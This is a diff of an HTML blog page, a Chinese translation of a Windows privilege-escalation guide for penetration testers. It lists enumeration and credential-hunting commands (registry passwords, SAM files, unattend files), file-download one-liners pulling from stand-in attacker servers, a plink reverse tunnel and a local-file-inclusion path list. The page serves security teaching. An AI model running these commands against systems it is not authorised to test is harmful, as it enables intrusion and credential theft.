@@ -5,6 +5,9 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
 
     <title>Windows提权指南 | 码中春秋&#39;s Blog</title>
     <meta property="og:title" content="Windows提权指南 - 码中春秋&#39;s Blog">
@@ -20,15 +23,16 @@
         
     <meta name="author" content="码中春秋">
     <meta property="og:url" content="https://blog.taielab.com/2018-04-01/windows-getshell-guide.html">
-    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href='/favicon.ico'  type="image/x-icon">
 
     <link rel="stylesheet" href='/css/normalize.css'>
     <link rel="stylesheet" href='/css/style.css'>
-    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 
     
-
-
+    
+    
+    
     
     
         <link rel="stylesheet" href='/css/douban.css'>
@@ -36,7 +40,6 @@
         <link rel="stylesheet" href='/css/other.css'>
     
 </head>
-
 
 <body>
     <header id="header" class="clearfix">
@@ -54,7 +57,7 @@
                 <nav id="nav-menu" class="clearfix">
                     <a class="current" href="https://blog.taielab.com">首页</a>
                     
-                    <a  href="https://blog.taielab.com/archives/" title="存档">存档</a>
+                    <a  href="https://blog.taielab.com/archives/" title="归档">归档</a>
                     
                     <a  href="https://blog.taielab.com/about/" title="关于">关于</a>
                     
@@ -159,8 +162,8 @@
         var postToc = $(".post-toc");
         if (postToc.length) {
             var leftPos = $("#main").offset().left;
-            if(leftPos<220){
-                postToc.css({"width":leftPos-10,"margin-left":(0-leftPos)})
+            if (leftPos < 220) {
+                postToc.css({ "width": leftPos - 10, "margin-left": (0 - leftPos) })
             }
 
             var t = postToc.offset().top - 20,
@@ -179,6 +182,10 @@
                 e < t ? postToc.css(a.start) : postToc.css(a.process)
             })
         }
+
+        if ($("#TableOfContents").children().length < 1) {
+            $(".post-toc").remove();
+        }
     })
 </script>
     <article class="post">
@@ -192,7 +199,7 @@
         <div class="post-meta">
             <span>|</span>
             
-            <span class="meta-category"><a href='https://blog.taielab.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8'>网络安全</a></span>
+            <span class="meta-category"><a href='/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8'>网络安全</a></span>
             
         </div>
         
@@ -216,41 +223,41 @@
 <p>在每个部分中，我首先提供CMD命令，然后是一个Powershell的同等命令。同时拥有这两种工具感觉更方便，Powershell比传统的CMD更适用于脚本。然而并不是Powershell适用于全部场景（或者CMD在某些事情上仍然简单/更好），所以一些部分将只包含常规的CMD命令。</p>
 <h2 id="操作系统">操作系统</h2>
 <p>操作系统和体系结构是什么？ 没有打补丁?</p>
-<pre><code>systeminfo
+<pre tabindex="0"><code>systeminfo
 wmic qfe
 </code></pre><p>在环境变量有什么漏洞?在LOGONSERVER域控制器?</p>
-<pre><code>set
-</code></pre><pre><code>Get-ChildItem Env: | ft Key,Value
+<pre tabindex="0"><code>set
+</code></pre><pre tabindex="0"><code>Get-ChildItem Env: | ft Key,Value
 </code></pre><p>有没有其他连接的驱动器？</p>
-<pre><code>net use
+<pre tabindex="0"><code>net use
 wmic logicaldisk get caption,description,providername
-</code></pre><pre><code>Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root
+</code></pre><pre tabindex="0"><code>Get-PSDrive | where {$_.Provider -like &#34;Microsoft.PowerShell.Core\FileSystem&#34;}| ft Name,Root
 </code></pre><h2 id="用户">用户</h2>
 <p>你是谁？</p>
-<pre><code>whoami
+<pre tabindex="0"><code>whoami
 echo %USERNAME%
-</code></pre><pre><code>$env:UserName
+</code></pre><pre tabindex="0"><code>$env:UserName
 </code></pre><p>系统上有哪些用户？任何旧的用户配置文件有没有清理？</p>
-<pre><code>net users
-dir /b /ad &quot;C:\Users\&quot;
-dir /b /ad &quot;C:\Documents and Settings\&quot; # Windows XP and below
-</code></pre><pre><code>Get-LocalUser | ft Name,Enabled,LastLogon
+<pre tabindex="0"><code>net users
+dir /b /ad &#34;C:\Users\&#34;
+dir /b /ad &#34;C:\Documents and Settings\&#34; # Windows XP and below
+</code></pre><pre tabindex="0"><code>Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
 </code></pre><p>是否有其他人登录？</p>
-<pre><code>qwinsta
+<pre tabindex="0"><code>qwinsta
 </code></pre><p>系统上有哪些组？</p>
-<pre><code>net localgroup
-</code></pre><pre><code>Get-LocalGroup | ft Name
+<pre tabindex="0"><code>net localgroup
+</code></pre><pre tabindex="0"><code>Get-LocalGroup | ft Name
 </code></pre><p>在管理员组中的所有用户？</p>
-<pre><code>net localgroup Administrators
-</code></pre><pre><code>Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+<pre tabindex="0"><code>net localgroup Administrators
+</code></pre><pre tabindex="0"><code>Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 </code></pre><p>用户自动登录注册表中的任何内容？</p>
-<pre><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;
-</code></pre><pre><code>Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select &quot;Default*&quot;
+<pre tabindex="0"><code>reg query &#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34; 2&gt;nul | findstr &#34;DefaultUserName DefaultDomainName DefaultPassword&#34;
+</code></pre><pre tabindex="0"><code>Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#39; | select &#34;Default*&#34;
 </code></pre><p>Credential Manager（凭据管理器）中有什么有趣的东西？</p>
-<pre><code>cmdkey /list
+<pre tabindex="0"><code>cmdkey /list
 </code></pre><p>我们可以访问SAM和SYSTEM文件吗？</p>
-<pre><code>%SYSTEMROOT%\repair\SAM
+<pre tabindex="0"><code>%SYSTEMROOT%\repair\SAM
 %SYSTEMROOT%\System32\config\RegBack\SAM
 %SYSTEMROOT%\System32\config\SAM
 %SYSTEMROOT%\repair\system
@@ -258,176 +265,143 @@ Get-ChildItem C:\Users -Force | select Name
 %SYSTEMROOT%\System32\config\RegBack\system
 </code></pre><h2 id="程序进程和服务">程序，进程和服务</h2>
 <p>安装了什么软件？</p>
-<pre><code>dir /a &quot;C:\Program Files&quot;
-dir /a &quot;C:\Program Files (x86)&quot;
+<pre tabindex="0"><code>dir /a &#34;C:\Program Files&#34;
+dir /a &#34;C:\Program Files (x86)&#34;
 reg query HKEY_LOCAL_MACHINE\SOFTWARE
-</code></pre><pre><code>Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+</code></pre><pre tabindex="0"><code>Get-ChildItem &#39;C:\Program Files&#39;, &#39;C:\Program Files (x86)&#39; | ft Parent,Name,LastWriteTime
 
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 </code></pre><p>有没有弱的文件夹或文件的权限？</p>
 <p>所有人或当前用户在程序文件夹上的完全权限？</p>
-<pre><code>icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;
-icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;
+<pre tabindex="0"><code>icacls &#34;C:\Program Files\*&#34; 2&gt;nul | findstr &#34;(F)&#34; | findstr &#34;Everyone&#34;
+icacls &#34;C:\Program Files (x86)\*&#34; 2&gt;nul | findstr &#34;(F)&#34; | findstr &#34;Everyone&#34;
 
-icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;
-icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; 
+icacls &#34;C:\Program Files\*&#34; 2&gt;nul | findstr &#34;(F)&#34; | findstr &#34;BUILTIN\Users&#34;
+icacls &#34;C:\Program Files (x86)\*&#34; 2&gt;nul | findstr &#34;(F)&#34; | findstr &#34;BUILTIN\Users&#34; 
 </code></pre><p>修改程序文件夹上每个人或用户的权限？</p>
-<pre><code>icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;
-icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;
+<pre tabindex="0"><code>icacls &#34;C:\Program Files\*&#34; 2&gt;nul | findstr &#34;(M)&#34; | findstr &#34;Everyone&#34;
+icacls &#34;C:\Program Files (x86)\*&#34; 2&gt;nul | findstr &#34;(M)&#34; | findstr &#34;Everyone&#34;
 
-icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; 
-icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; 
-</code></pre><pre><code>Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
+icacls &#34;C:\Program Files\*&#34; 2&gt;nul | findstr &#34;(M)&#34; | findstr &#34;BUILTIN\Users&#34; 
+icacls &#34;C:\Program Files (x86)\*&#34; 2&gt;nul | findstr &#34;(M)&#34; | findstr &#34;BUILTIN\Users&#34; 
+</code></pre><pre tabindex="0"><code>Get-ChildItem &#39;C:\Program Files\*&#39;,&#39;C:\Program Files (x86)\*&#39; | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match &#39;Everyone&#39;} } catch {}} 
 
-Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} 
+Get-ChildItem &#39;C:\Program Files\*&#39;,&#39;C:\Program Files (x86)\*&#39; | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match &#39;BUILTIN\Users&#39;} } catch {}} 
 </code></pre><p>您也可以从Sysinternals上传accesschk来检查可写文件夹和文件。</p>
-<pre><code>AccessChk主要用来检查用户和用户组对文件，目录，注册表项，全局对象和系统服务的权限详细情况，在实际配置过程中如果权限设置失误，则就可以被用来提权。
+<pre tabindex="0"><code>AccessChk主要用来检查用户和用户组对文件，目录，注册表项，全局对象和系统服务的权限详细情况，在实际配置过程中如果权限设置失误，则就可以被用来提权。
 
 下载地址
 https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
 
 深入使用案列
 http://zhuanlan.51cto.com/art/201704/537104.htm
-</code></pre><pre><code>accesschk.exe -qwsu &quot;Everyone&quot; *
-accesschk.exe -qwsu &quot;Authenticated Users&quot; *
-accesschk.exe -qwsu &quot;Users&quot; *
+</code></pre><pre tabindex="0"><code>accesschk.exe -qwsu &#34;Everyone&#34; *
+accesschk.exe -qwsu &#34;Authenticated Users&#34; *
+accesschk.exe -qwsu &#34;Users&#34; *
 </code></pre><p>系统上正在运行的进程/服务是什么？有没有暴露的内部服务？如果是这样，我们可以打开它吗？<em>请参阅附录中的端口转发。</em></p>
-<pre><code>tasklist /svc
+<pre tabindex="0"><code>tasklist /svc
 tasklist /v
 net start
 sc query
-</code></pre><pre><code>Get-Process | ft ProcessName,Id
+</code></pre><pre tabindex="0"><code>Get-Process | ft ProcessName,Id
 Get-Service
 </code></pre><p>是否有任何弱服务权限？我们可以重新配置什么吗？再次上传accesschk。</p>
-<pre><code>accesschk.exe -uwcqv &quot;Everyone&quot; *
-accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
-accesschk.exe -uwcqv &quot;Users&quot; *
+<pre tabindex="0"><code>accesschk.exe -uwcqv &#34;Everyone&#34; *
+accesschk.exe -uwcqv &#34;Authenticated Users&#34; *
+accesschk.exe -uwcqv &#34;Users&#34; *
 </code></pre><p>有没有引用的服务路径？</p>
-<pre><code>wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;
+<pre tabindex="0"><code>wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &#34;Auto&#34; 2&gt;nul |findstr /i /v &#34;C:\Windows\\&#34; 2&gt;nul |findstr /i /v &#34;&#34;&#34;
 </code></pre><p>有什么计划的任务？任何自定义实现？</p>
-<pre><code>schtasks /query /fo LIST 2&gt;nul | findstr TaskName
+<pre tabindex="0"><code>schtasks /query /fo LIST 2&gt;nul | findstr TaskName
 dir C:\windows\tasks
-</code></pre><pre><code>Get-ScheduledTask | ft TaskName, State
-
+</code></pre><pre tabindex="0"><code>Get-ScheduledTask | ft TaskName, State
 </code></pre><p>启动时运行的是什么？</p>
-<pre><code>wmic startup get caption,command
+<pre tabindex="0"><code>wmic startup get caption,command
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
-dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;
-dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;
-
-</code></pre><pre><code>Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
-Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
-Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
-Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
-Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
-Get-ChildItem &quot;C:\Users\All Users\Start Menu\Programs\Startup&quot;
-Get-ChildItem &quot;C:\Users\$env:USERNAME\Start Menu\Programs\Startup&quot;
-
+dir &#34;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&#34;
+dir &#34;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&#34;
+</code></pre><pre tabindex="0"><code>Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#39;
+Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;
+Get-ItemProperty -Path &#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#39;
+Get-ItemProperty -Path &#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;
+Get-ChildItem &#34;C:\Users\All Users\Start Menu\Programs\Startup&#34;
+Get-ChildItem &#34;C:\Users\$env:USERNAME\Start Menu\Programs\Startup&#34;
 </code></pre><p>AlwaysInstallElevated是否启用？<em>我没有跑过这个，但检查没有问题。</em></p>
-<pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
+<pre tabindex="0"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 </code></pre><h2 id="联网">联网</h2>
 <p>什么网卡连接？有多少网络？</p>
-<pre><code>ipconfig /all
-
-</code></pre><pre><code>Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
-
+<pre tabindex="0"><code>ipconfig /all
+</code></pre><pre tabindex="0"><code>Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 </code></pre><p>我们有什么路线？</p>
-<pre><code>route print
-
-</code></pre><pre><code>Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
-
+<pre tabindex="0"><code>route print
+</code></pre><pre tabindex="0"><code>Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 </code></pre><p>ARP缓存中有什么？</p>
-<pre><code>arp -a
-
-</code></pre><pre><code>Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
-
+<pre tabindex="0"><code>arp -a
+</code></pre><pre tabindex="0"><code>Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
 </code></pre><p>是否有连接到其他主机？</p>
-<pre><code>netstat -ano
-
+<pre tabindex="0"><code>netstat -ano
 </code></pre><p>主机文件中的任何东西？</p>
-<pre><code>C:\WINDOWS\System32\drivers\etc\hosts
-
+<pre tabindex="0"><code>C:\WINDOWS\System32\drivers\etc\hosts
 </code></pre><p>防火墙是否打开？如果是这样配置的？</p>
-<pre><code>netsh firewall show state
+<pre tabindex="0"><code>netsh firewall show state
 netsh firewall show config
 netsh advfirewall firewall show rule name=all
-netsh advfirewall export &quot;firewall.txt&quot;
-
+netsh advfirewall export &#34;firewall.txt&#34;
 </code></pre><p>任何其他有趣的接口配置？</p>
-<pre><code>netsh dump
-
+<pre tabindex="0"><code>netsh dump
 </code></pre><p>有没有SNMP配置？</p>
-<pre><code>reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
-
-</code></pre><pre><code>Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
-
+<pre tabindex="0"><code>reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+</code></pre><pre tabindex="0"><code>Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 </code></pre><h2 id="有趣的文件和敏感信息">有趣的文件和敏感信息</h2>
 <p>这部分可能有点乱，所以你可能想到的输出命令到txt文件进行审查和解析。</p>
 <p>在注册表中的任何密码？</p>
-<pre><code>reg query HKCU /f password /t REG_SZ /s
+<pre tabindex="0"><code>reg query HKCU /f password /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s 
-
 </code></pre><p>有没有清理的sysprep或无人值守文件？</p>
-<pre><code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul
-
-</code></pre><pre><code>Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)}
-
+<pre tabindex="0"><code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul
+</code></pre><pre tabindex="0"><code>Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like &#34;*.xml&#34; -or $_.Name -like &#34;*.txt&#34; -or $_.Name -like &#34;*.ini&#34;)}
 </code></pre><p>如果服务器是IIS网络服务器，那么inetpub中有什么？任何隐藏的目录？web.config文件？</p>
-<pre><code>dir /a C:\inetpub\
+<pre tabindex="0"><code>dir /a C:\inetpub\
 dir /s web.config
 C:\Windows\System32\inetsrv\config\applicationHost.config
-
-</code></pre><pre><code>Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
-
+</code></pre><pre tabindex="0"><code>Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 </code></pre><p>有什么IIS日志？</p>
-<pre><code>C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
+<pre tabindex="0"><code>C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
 C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
 C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
 C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
-
 </code></pre><p>是否安装了XAMPP，Apache或PHP？任何存在XAMPP，Apache或PHP的配置文件？</p>
-<pre><code>dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
-
-</code></pre><pre><code>Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
-
+<pre tabindex="0"><code>dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
+</code></pre><pre tabindex="0"><code>Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
 </code></pre><p>有Apache网络日志？</p>
-<pre><code>dir /s access.log error.log
-
-</code></pre><pre><code>Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
-
+<pre tabindex="0"><code>dir /s access.log error.log
+</code></pre><pre tabindex="0"><code>Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
 </code></pre><p>任何有趣的文件，看看？可能在用户目录（桌面，文档等）？</p>
-<pre><code>dir /s *pass* == *vnc* == *.config* 2&gt;nul
-
-</code></pre><pre><code>Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
-
+<pre tabindex="0"><code>dir /s *pass* == *vnc* == *.config* 2&gt;nul
+</code></pre><pre tabindex="0"><code>Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
 </code></pre><p>其中包含密码的文件？</p>
-<pre><code>findstr /si password *.xml *.ini *.txt *.config 2&gt;nul
-
-</code></pre><pre><code>Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern &quot;password&quot;
-
+<pre tabindex="0"><code>findstr /si password *.xml *.ini *.txt *.config 2&gt;nul
+</code></pre><pre tabindex="0"><code>Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern &#34;password&#34;
 </code></pre><h1 id="附录">附录</h1>
 <h2 id="传输文件">传输文件</h2>
 <p>在Windows特权升级过程中的某个时候，您需要将文件放到您的目标靶机上。下面是一些简单的方法来做到这一点。</p>
 <p>Powershell Cmdlet（Powershell 3.0及更高版本）</p>
-<pre><code>Invoke-WebRequest &quot;https://myserver/filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;
-
+<pre tabindex="0"><code>Invoke-WebRequest &#34;https://myserver/filename&#34; -OutFile &#34;C:\Windows\Temp\filename&#34;
 </code></pre><p>Powershell One-Liner</p>
-<pre><code>(New-Object System.Net.WebClient).DownloadFile(&quot;https://myserver/filename&quot;, &quot;C:\Windows\Temp\filename&quot;) 
-
+<pre tabindex="0"><code>(New-Object System.Net.WebClient).DownloadFile(&#34;https://myserver/filename&#34;, &#34;C:\Windows\Temp\filename&#34;) 
 </code></pre><p>Powershell脚本</p>
-<pre><code>echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
-echo $url = &quot;http://IPADDRESS/file.exe&quot; &gt;&gt;wget.ps1
-echo $file = &quot;output-file.exe&quot; &gt;&gt;wget.ps1
+<pre tabindex="0"><code>echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
+echo $url = &#34;http://IPADDRESS/file.exe&#34; &gt;&gt;wget.ps1
+echo $file = &#34;output-file.exe&#34; &gt;&gt;wget.ps1
 echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
-
 </code></pre><p>通过文本文件的非交互式FTP。<em>当你只有有限的命令执行时很有用。</em></p>
-<pre><code>echo open 10.10.10.11 21&gt; ftp.txt
+<pre tabindex="0"><code>echo open 10.10.10.11 21&gt; ftp.txt
 echo USER username&gt;&gt; ftp.txt
 echo mypassword&gt;&gt; ftp.txt
 echo bin&gt;&gt; ftp.txt
@@ -435,28 +409,24 @@ echo GET filename&gt;&gt; ftp.txt
 echo bye&gt;&gt; ftp.txt
 		
 ftp -v -n -s:ftp.txt
-
 </code></pre><p>CERTUTIL</p>
 <p>用于证书管理</p>
 <p>支持xp-win10</p>
 <p>更多操作说明见<code>https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx</code></p>
-<pre><code>certutil.exe -urlcache -split -f https://myserver/filename outputfilename
-
+<pre tabindex="0"><code>certutil.exe -urlcache -split -f https://myserver/filename outputfilename
 </code></pre><p>具体案列</p>
-<pre><code>https://twitter.com/subTee/status/888101536475344896
+<pre tabindex="0"><code>https://twitter.com/subTee/status/888101536475344896
 https://twitter.com/subTee/status/888071631528235010
-
 </code></pre><h2 id="转发端口">转发端口</h2>
 <p>这对于暴露机器外部不可用的内部服务非常有用，通常是由于防火墙设置。</p>
 <p>上传<code>plink.exe</code>到目标。</p>
 <p>在攻击机器上启动SSH。</p>
 <p>例如要公开SMB，在目标上运行：</p>
-<pre><code>plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
-
+<pre tabindex="0"><code>plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 </code></pre><p><em>注意：从Windows 10的秋季创作者更新版本开始，OpenSSH已经在Windows版beta中推出，所以我预计有一天我们可能只能使用普通的旧版SSH命令来进行端口转发，具体取决于是否启用。</em></p>
 <h2 id="本地文件包含列表">本地文件包含列表</h2>
 <p>这不是一个详尽的列表，安装目录会有所不同，我只列出了常见的。</p>
-<pre><code>C:\Apache\conf\httpd.conf
+<pre tabindex="0"><code>C:\Apache\conf\httpd.conf
 C:\Apache\logs\access.log
 C:\Apache\logs\error.log
 C:\Apache2\conf\httpd.conf
@@ -479,7 +449,7 @@ C:\Program Files (x86)\Apache Group\Apache\logs\error.log
 C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
 C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
 C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
-c:\Program Files (x86)\php\php.ini&quot;
+c:\Program Files (x86)\php\php.ini&#34;
 C:\Program Files\Apache Group\Apache\conf\httpd.conf
 C:\Program Files\Apache Group\Apache\conf\logs\access.log
 C:\Program Files\Apache Group\Apache\conf\logs\error.log
@@ -530,12 +500,10 @@ C:\xampp\php\php.ini
 C:\xampp\security\webdav.htpasswd
 C:\xampp\sendmail\sendmail.ini
 C:\xampp\tomcat\conf\server.xml
-
 </code></pre><h2 id="漏洞工具">漏洞工具</h2>
-<pre><code>https://github.com/SecWiki/windows-kernel-exploits
+<pre tabindex="0"><code>https://github.com/SecWiki/windows-kernel-exploits
 https://github.com/abatchy17/WindowsExploits
 https://github.com/pentestmonkey/windows-privesc-check
-
 </code></pre><blockquote>
 <p>翻译自：http://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</p>
 </blockquote>
@@ -560,20 +528,39 @@ https://github.com/pentestmonkey/windows-privesc-check
             
             <ul class="clearfix">
                 
-                <li><a href='https://blog.taielab.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F'>内网渗透</a></li>
+                <li><a href='/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F'>内网渗透</a></li>
                 
             </ul>
             
         </div>
     </article>
     
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
     
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
 
     
     
     <div class="post bg-white">
       <script src="https://utteranc.es/client.js"
-            repo= "udpsec/blog-comments"
+            repo= "taielab"
             issue-term="pathname"
             theme="github-light"
             crossorigin="anonymous"
@@ -581,13 +568,47 @@ https://github.com/pentestmonkey/windows-privesc-check
       </script>
     </div>
     
+    
+    
+
 </div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2022 <a href="https://blog.taielab.com">码中春秋&#39;s Blog By 码中春秋</a>
+        
+    </div>
+    <br />
+
+</footer>
+
+
+    
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+    <script src='/js/douban.js'></script>
 
                 </div>
 
